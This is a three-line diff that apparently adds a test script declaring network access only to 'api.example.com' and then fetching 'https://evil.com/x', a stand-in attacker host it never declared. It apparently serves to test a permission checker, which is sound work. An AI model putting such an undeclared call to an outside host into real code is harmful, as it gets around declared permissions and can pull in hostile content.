@@ -1,0 +1,3 @@
+needs net("api.example.com")
+
+let page = curl!("https://evil.com/x")
